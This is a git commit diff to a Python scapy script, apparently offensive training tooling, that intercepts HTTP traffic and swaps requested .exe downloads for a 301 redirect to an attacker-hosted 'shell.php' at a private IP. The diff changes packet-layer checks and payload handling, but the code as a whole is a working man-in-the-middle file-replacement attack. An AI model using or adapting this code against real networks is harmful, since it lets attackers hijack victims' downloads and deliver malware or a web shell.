d3619162e40a53afed5384cb454b20d736c0dc4f
GenNiox <75768603+GenNiox@users.noreply.github.com>
2023-02-20 03:13:43 -0700

    Add files via upload

--- HTTP_Modifier/HTTP_Modifier_Python3.py
+++ HTTP_Modifier/HTTP_Modifier_Python3.py
@@ -35,9 +35,10 @@ def set_load(packet, load):
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
+    if scapy_packet.haslayer(scapy.Raw):
+    # if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
         if scapy_packet[scapy.TCP].dport == 80:
-            if ".exe" in scapy_packet[scapy.Raw].load.decode():
+            if ".exe" in scapy_packet[scapy.Raw].load:
                 print("[+] .exe Request]")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
         elif scapy_packet[scapy.TCP].sport == 80:
@@ -45,7 +46,7 @@ def process_packet(packet):
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file..")
                 modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.222.111.228/shell.php\n\n")
-                packet.set_payload(bytes(modified_packet))
+                packet.set_payload(str(modified_packet))
 
     packet.accept()  # Forwards packets
     # packet.drop()  # Drops packets
